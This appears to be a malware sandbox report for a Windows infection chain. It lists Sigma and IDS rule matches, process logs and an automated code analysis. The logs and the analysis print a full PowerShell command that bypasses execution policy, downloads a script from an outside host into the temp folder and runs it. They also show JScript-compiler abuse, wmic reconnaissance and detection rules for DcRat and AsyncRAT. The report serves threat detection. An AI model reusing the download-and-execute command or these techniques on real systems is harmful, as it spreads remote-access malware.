threat_severity.level_description: Severity HIGH because it was considered unknown. Other contributing factor was that it could not be run in sandboxes.

attributes.magic: ASCII text, with no line terminators

sigma_analysis_results.rule_description: Detects suspicious PowerShell invocation with a parameter substring
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Daniel Bohannon (idea), Roberto Rodriguez (Fix)

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=PowerShell.EXE; Hashes=MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7; Description=Windows PowerShell; EventID=1; ParentCommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "Start-Process PowerShell -Args '-ep Bypass -c &{iwr https://bknoww.com -OutFile C:\Users\Bruno\AppData\Local\Temp\tt.ps1 -UseBasicParsing;& C:\Users\Bruno\AppData\Local\Temp\tt.ps1}'"; CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ep Bypass -c &{iwr https://bknoww.com -OutFile C:\Users\Bruno\AppData\Local\Temp\tt.ps1 -UseBasicParsing;& C:\Users\Bruno\AppData\Local\Temp\tt.ps1} ; FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description:
Detects the creation of potentially malicious script and executable files in Windows startup folders, which is a common persistence technique used by threat actors.
These files (.ps1, .vbs, .js, .bat, etc.) are automatically executed when a user logs in, making the Startup folder an attractive target for attackers.
This technique is frequently observed in malvertising campaigns and malware distribution where attackers attempt to maintain long-term access to compromised systems.
sigma_analysis_results.rule_author: Nasreddine Bencherchali (Nextron Systems), Swachchhanda Shrawan Poudel (Nextron Systems)

sigma_analysis_results.rule_description:
Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic.
Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.

match_context.values:
@{ScriptBlockText=<#
.SYNOPSIS
    Pythonv2 Installer for Pythonv2 Runtime Access
.DESCRIPTION
    Official installer for Pythonv2 runtime solution.
.AUTHOR
    IT Infrastructure
.VERSION
    2026.2
#>

# Function for fast download using .NET WebClient
function Download-FileFast {
    param(
        [string]$Url,
        [string]$DestinationPath
    )
    
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0;  [TRUNCATED]; Path=C:\Users\Bruno\AppData\Local\Temp\tt.ps1; ScriptBlockId=94ce1ad9-541d-44d1-8e1b-a334b962ef9c; MessageTotal=1; MessageNumber=1; EventID=4104}

sigma_analysis_results.rule_title: Potential Binary Or Script Dropper Via PowerShell
sigma_analysis_results.rule_description: Detects PowerShell creating a binary executable or a script file.
Detects execution of wmic utility with the "computersystem" flag in order to obtain information about the machine such as the domain, username, model, etc.

match_context.values: @{Hashes=MD5=82BB8430531876FBF5266E53460A393E,SHA256=9578C31E1B58FA75A2B612456EBCE324296E53A007E5697995CEC5785956AFE4,IMPHASH=09405355AF00B2202306292C39E63FB3; CurrentDirectory=C:\Windows\Microsoft.NET\Framework\v4.0.30319\; OriginalFileName=wmic.exe; Product=Microsoft\xae Windows\xae Operating System; Description=WMI Commandline Utility; FileVersion=10.0.19041.1 (WinBuild.160101.0800); ParentCommandLine="C:\Windows\Microsoft.NET\Framework\v4.0.30319\jsc.exe"; CommandLine="wmic" computersystem get domain; EventID=1; ParentImage=C:\Windows\Microsoft.NET\Framework\v4.0.30319\jsc.exe; IntegrityLevel=High; Image=C:\Windows\SysWOW64\wbem\WMIC.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description:
Detects the execution of the "jsc.exe" (JScript Compiler).
Attacker might abuse this in order to compile JScript files on the fly and bypassing application whitelisting.

match_context.values: @{Product=Microsoft\xae .NET Framework; CurrentDirectory=C:\Windows\Microsoft.NET\Framework\v4.0.30319\; OriginalFileName=jsc.exe; Hashes=MD5=94C8E57A80DFCA2482DEDB87B93D4FD9,SHA256=39E87F0EDCDD15582CFEFDFAB1975AADD2C7CA1E3A5F07B1146CE3206F401BB5,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744; Description=jsc.exe; FileVersion=14.8.4084.0 built by: NET48REL1; ParentCommandLine="C:\Users\Bruno\AppData\Roaming\pythonv11\pythonw.exe" ; CommandLine="C:\Windows\Microsoft.NET\Framework\v4.0.30319\jsc.exe"; EventID=1; ParentImage=C:\Users\Bruno\AppData\Roaming\pythonv11\pythonw.exe; IntegrityLevel=High; Image=C:\Windows\Microsoft.NET\Framework\v4.0.30319\jsc.exe; Company=Microsoft Corporation}

crowdsourced_ids_results.rule_msg: ET MALWARE Observed Malicious SSL Cert (Various RAT)
crowdsourced_ids_results.rule_raw: alert tls $EXTERNAL_NET any -> $HOME_NET any (msg:"ET MALWARE Observed Malicious SSL Cert (Various RAT)"; flow:established,to_client; tls.cert_issuer; content:"qwqdanchun"; fast_pattern; reference:url,app.any.run/tasks/8d2b933d-fab2-44d0-9ea7-d6f1064373e0?malconf=true; classtype:trojan-activity; sid:2062501; rev:1; metadata:attack_target Client_Endpoint, created_at 2025_05_21, deployment Perimeter, confidence High, signature_severity Major, tag SSL_Malicious_Cert, updated_at 2025_05_21;)

alert tcp $EXTERNAL_NET any -> $HOME_NET any ( msg:"MALWARE-CNC Win.Trojan.DcRat variant communication attempt"; flow:to_client,established; content:"|16 03|"; content:"|02|",within 1,distance 3; content:"|55 04 0A|"; content:"DcRat By qwqdanchun",within 19,distance 2; metadata:impact_flag red,policy balanced-ips drop,policy max-detect-ips drop,policy security-ips drop; service:ssl; reference:url,www.virustotal.com/gui/file/dc2ffbc7481a2b7ed0579fae72bb092bf2a453608fb7d520288a1ea8a1557d48; classtype:trojan-activity; gid:1; sid:64373; rev:1; )

crowdsourced_ids_results.rule_msg: ET INFO Session Traversal Utilities for NAT (STUN Binding Request)
crowdsourced_ids_results.rule_raw: alert udp $HOME_NET any -> $EXTERNAL_NET 3478 (msg:"ET INFO Session Traversal Utilities for NAT (STUN Binding Request)"; content:"|00 01|"; depth:2; content:"|21 12 a4 42|"; distance:2; within:4; reference:url,tools.ietf.org/html/rfc5389; classtype:misc-activity; sid:2016149; rev:3; metadata:created_at 2013_01_04, deployment Perimeter, deployment alert_only, confidence High, signature_severity Informational, updated_at 2023_04_24;)

crowdsourced_ids_results.rule_raw: alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET INFO PS1 Powershell File Request"; flow:established,from_client; flowbits:set,ET.PS.Download; http.request_line; content:".ps1 HTTP/1."; nocase; fast_pattern; classtype:bad-unknown; sid:2032162; rev:1; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, created_at 2021_03_18, deployment Perimeter, confidence High, signature_severity Informational, updated_at 2021_03_18;)

crowdsourced_ids_results.rule_msg: ET INFO Windows Powershell User-Agent Usage
crowdsourced_ids_results.rule_raw: alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET INFO Windows Powershell User-Agent Usage"; flow:established,to_server; http.user_agent; content:"Mozilla/"; startswith; content:") WindowsPowerShell/"; distance:0; fast_pattern; classtype:not-suspicious; sid:2033355; rev:1; metadata:attack_target Client_Endpoint, created_at 2021_07_16, deployment Perimeter, confidence High, signature_severity Informational, tag Description_Generated_By_Proofpoint_Nexus, updated_at 2021_07_16;)

crowdsourced_ids_results.rule_msg: SURICATA STREAM Packet with invalid timestamp
crowdsourced_ids_results.rule_raw: alert tcp any any -> any any (msg:"SURICATA STREAM Packet with invalid timestamp"; stream-event:pkt_invalid_timestamp; classtype:protocol-command-decode; sid:2210044; rev:2;)

crowdsourced_ids_results.rule_msg: SURICATA STREAM SHUTDOWN RST invalid ack
crowdsourced_ids_results.rule_raw: alert tcp any any -> any any (msg:"SURICATA STREAM SHUTDOWN RST invalid ack"; stream-event:rst_invalid_ack; classtype:protocol-command-decode; sid:2210046; rev:2;)

crowdsourced_ids_results.rule_msg: SSLBL: Malicious SSL certificate detected (DCRat C&C)
crowdsourced_ids_results.rule_raw: alert tls $EXTERNAL_NET any -> $HOME_NET any (msg:"SSLBL: Malicious SSL certificate detected (DCRat C&C)"; tls.fingerprint:"63:86:26:0b:2e:29:60:11:09:08:16:9e:50:cd:ed:c8:22:0b:3c:4e"; reference:url, sslbl.abuse.ch/ssl-certificates/sha1/6386260b2e2960110908169e50cdedc8220b3c4e/; sid:902207365; rev:1;)

crowdsourced_ids_results.rule_msg: SSLBL: Malicious JA3 SSL-Client Fingerprint detected (AsyncRAT)
crowdsourced_ids_results.rule_raw: alert tls any any -> any any (msg:"SSLBL: Malicious JA3 SSL-Client Fingerprint detected (AsyncRAT)"; ja3_hash; content:"fc54e0d16d9764783542f0146a98b300"; reference:url, sslbl.abuse.ch/ja3-fingerprints/fc54e0d16d9764783542f0146a98b300/; sid:906200096; rev:1;)

crowdsourced_ai_results.analysis:
The provided PowerShell code is designed to download and execute a script from a remote server. It uses the `Start-Process` cmdlet to initiate a new PowerShell process with the following key components:

1. Execution Policy Bypass: The `-ep Bypass` argument is used to bypass the PowerShell execution policy, which is a security feature that restricts the execution of scripts. This indicates an intent to run potentially harmful scripts without user consent or system restrictions.

2. Invoke-WebRequest (iwr): The code utilizes `iwr` (short for `Invoke-WebRequest`) to download a script from the URL `https://bknoww.com`. This URL is likely to host malicious content, as it is not a well-known or trusted source.

3. Output to Temporary File: The downloaded script is saved to a temporary file located in the user's TEMP directory (`$env:TEMP\tt.ps1`). This is a common tactic used by malware to execute downloaded scripts without raising immediate suspicion.

4. Execution of Downloaded Script: After downloading, the script is executed immediately with `& $env:TEMP\tt.ps1`. This means that the code not only downloads potentially harmful content but also runs it, which is a typical behavior of malware.

Overall, the code demonstrates clear malicious intent by bypassing security measures, downloading a script from an untrusted source, and executing it without user interaction.

The code initiates a new PowerShell process to download and execute a remote script. It sets the execution policy to 'Bypass' to allow the execution of unsigned scripts. It then downloads a script from `https://bknoww.com` and saves it as `tt.ps1` in the user's temporary directory. Immediately after downloading, the newly saved script is executed.
